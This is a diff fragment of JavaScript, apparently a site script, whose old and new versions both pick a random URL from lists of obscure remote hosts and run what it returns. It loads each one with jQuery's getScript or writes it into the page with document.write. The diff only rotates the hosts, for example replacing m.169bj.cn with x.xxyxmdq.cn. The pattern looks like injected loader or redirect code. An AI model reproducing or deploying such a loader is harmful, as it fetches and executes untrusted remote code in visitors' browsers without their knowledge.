@@ -96,13 +96,13 @@ else
 else
 {dbs[1]='https://badskies.com/7f/a7/40/7fa740b32e403dc04ab6e74399d55b9e.js';}}
 else
-{dbs[0]='https://m.169bj.cn/c/4EE3BFE3-4615-401A-9E04-B66DB0BBFFCB.panda';dbs[1]='https://k.cnsayo.com/d.php?pid=8028';dbs[2]='https://yy.xinqiannv.com/dp.php?m=VlViT0JVczg3aTkxRg%3D%3D';dbs[3]='https://f.zgbmw.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';}
+{dbs[0]='https://x.xxyxmdq.cn/c/4EE3BFE3-4615-401A-9E04-B66DB0BBFFCB.panda';dbs[1]='https://k.cnsayo.com/d.php?pid=8028';dbs[2]='https://yy.xinqiannv.com/dp.php?m=VlViT0JVczg3aTkxRg%3D%3D';dbs[3]='https://yi.williamsouthwell.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';}
 var db=Math.floor(Math.random()*dbs.length);if(dbs[db].indexOf("<")!=-1)
 {document.write(dbs[db]);}
 else
 {$.getScript(dbs[db]);}}
 else
-{var xtbs=new Array();xtbs[0]='https://m.169bj.cn/c/B25EA802-F469-4C55-A839-67808FD83B81.panda';xtbs[1]='https://yy.xinqiannv.com/xtb.php?m=b1o4bVZyd001ei1iZA%3D%3D';xtbs[2]='https://f.zgbmw.com.cn/first/F7CAE0CB-C7A4-46CB-8C23-9E77F6629D26.yx';xtbs[3]='https://k.cnsayo.com/x.php?pid=8028';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
+{var xtbs=new Array();xtbs[0]='https://x.xxyxmdq.cn/c/B25EA802-F469-4C55-A839-67808FD83B81.panda';xtbs[1]='https://yy.xinqiannv.com/xtb.php?m=b1o4bVZyd001ei1iZA%3D%3D';xtbs[2]='https://yi.williamsouthwell.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';xtbs[3]='https://k.cnsayo.com/x.php?pid=8028';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
 {document.write(xtbs[xtb]);}
 else
 {$.getScript(xtbs[xtb]);}}}}
